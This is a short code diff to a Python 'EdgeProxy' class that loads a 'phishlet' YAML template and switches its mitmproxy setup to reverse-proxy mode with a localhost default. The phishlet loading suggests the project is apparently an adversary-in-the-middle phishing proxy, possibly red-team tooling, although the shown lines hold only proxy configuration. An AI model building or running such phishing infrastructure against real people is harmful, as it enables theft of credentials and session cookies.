@@ -70,18 +70,16 @@ class EdgeProxy:
         phishlet = self.phishlet_loader.load_from_yaml(phishlet_yaml)
         
         # Configure mitmproxy options
-        upstream_http = self.config.upstream_http or config.get("UPSTREAM_HTTP") or None
-        mode_val = None
-        if upstream_http:
-            mode_val = f"upstream:{upstream_http}"
+        upstream_http = self.config.upstream_http or config.get("UPSTREAM_HTTP") or "http://127.0.0.1"
+        mode_val = f"reverse:{upstream_http}"
+        
         opts = options.Options(
             listen_host=self.config.listen_host,
             listen_port=self.config.listen_port,
             ssl_insecure=True,
             http2=self.config.http2,
+            mode=[mode_val]
         )
-        if mode_val:
-            opts.update(mode=mode_val)
         # Optional: connection_strategy (not available on all mitmproxy versions)
         try:
             if hasattr(opts, "set"):
